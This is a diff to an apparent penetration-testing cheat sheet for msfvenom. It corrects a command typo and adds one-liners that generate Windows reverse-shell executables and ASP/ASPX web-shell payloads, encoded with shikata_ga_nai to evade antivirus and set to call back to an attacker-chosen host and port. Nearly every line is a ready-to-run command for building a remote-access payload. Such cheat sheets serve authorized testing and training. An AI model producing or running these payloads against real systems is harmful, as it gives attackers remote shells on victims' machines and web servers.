@@ -13,7 +13,7 @@ msfvenom -l <formats/payloads/encoders/nops>
 
 ```
 msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <filename>    #create runnable payload
-mfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <lang> -v <varname>     #create payload source code
+msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <lang> -v <varname>     #create payload source code
 ```
 
 ## Common payloads
@@ -22,6 +22,7 @@ mfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <lang> -v <varname>     #create 
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 8 -o rv.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 8 -o rv.exe
 msfvenom -p windows/powershell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 8 -o rv.exe
 ```
 
@@ -56,6 +57,10 @@ msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <lang> -v shellcode -b "<bad ch
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o rv.asp
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o rv.asp
+
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o rv.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o rv.aspx
 ```
 
 ### JSP reverse shell
